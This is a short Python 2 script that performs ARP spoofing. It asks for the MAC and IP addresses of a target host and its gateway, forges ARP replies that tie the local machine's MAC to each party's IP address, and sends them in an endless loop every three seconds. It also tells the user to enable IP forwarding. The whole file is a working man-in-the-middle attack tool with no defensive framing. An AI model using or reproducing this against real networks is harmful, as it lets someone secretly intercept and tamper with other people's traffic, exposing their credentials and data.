import socket
import struct
import binascii, time


s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(('eth0', socket.htons(0x0800)))

def pack_addr(ipaddr):
    
    pkaddr = socket.inet_aton(ipaddr)
    return pkaddr

def pack_mac(macaddr):
    
    hexMac = macaddr.replace(":", '').decode('hex')
    return hexMac

# Pack our input to hex
print "WARNING: Make sure You're in IPv4 forwarding mode!"
print "EX: echo 1 > /proc/sys/net/ipv4/ip_forward"
sorc = pack_mac(raw_input("Input MAC of local listening interface: "))
vicMac = pack_mac(raw_input("Input MAC of remote host: "))
gateMac = pack_mac(raw_input("Input MAC of gateway: "))
vicIP = pack_addr(raw_input("Input IP of Target : "))
gateIP = pack_addr(raw_input("Input IP of Gateway: "))

# Construct Ethernet Headers
arp_code = '\x08\x06'
eth1 = vicMac+sorc+arp_code # remote target
eth2 = gateMac+sorc+arp_code # gateway

# ARP header Info
htype = '\x00\x01'
protype = '\x08\x00'
hsize = '\x06'
psize = '\x04'
opcode = '\x00\x02'

# Build ARP Reply
arp_victim = eth1+htype+protype+hsize+psize+opcode+sorc+gateIP+vicMac+vicIP
arp_gateway = eth2+htype+protype+hsize+psize+opcode+sorc+vicIP+gateMac+gateIP

while True:
    time.sleep(3)
    s.send(arp_victim)
    s.send(arp_gateway)

